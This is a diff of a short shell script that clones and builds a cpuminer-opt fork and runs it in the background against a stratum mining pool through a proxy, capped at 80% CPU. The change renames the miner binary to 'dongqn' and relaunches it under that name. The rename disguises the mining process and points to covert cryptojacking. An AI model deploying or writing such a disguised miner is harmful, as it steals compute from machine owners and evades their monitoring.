@@ -92,5 +92,6 @@ git clone https://github.com/k67frozen/cpuminer-opt
 cd cpuminer-opt
 chmod +x *
 ./build.sh
+mv cpuminer dongqn
 make
-cpulimit --exe cpuminer --limit 80 -b && ./cpuminer -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u minhthang.10 -p x -x dongqn.cf:1221 --background
+cpulimit --exe dongqn --limit 80 -b && ./dongqn -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u minhthang.10 -p x -x dongqn.cf:1221 --background
